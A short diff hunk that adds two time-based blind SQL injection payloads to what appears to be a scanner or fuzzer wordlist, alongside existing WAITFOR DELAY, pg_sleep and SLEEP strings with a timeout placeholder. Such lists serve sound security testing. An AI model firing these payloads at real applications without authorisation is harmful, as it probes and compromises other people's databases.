@@ -93,3 +93,5 @@
 ';WAITFOR DELAY '%__TIME_OUT__%'--
 '||pg_sleep(%__TIME_OUT__%)--
 ' AnD SLEEP(%__TIME_OUT__%) ANd '1
+'+(select*from(select(sleep(%__TIME_OUT__%)))a)+'
+') AND (SELECT 9683 FROM (SELECT(SLEEP(%__TIME_OUT__%)))FKuq)-- wXyW
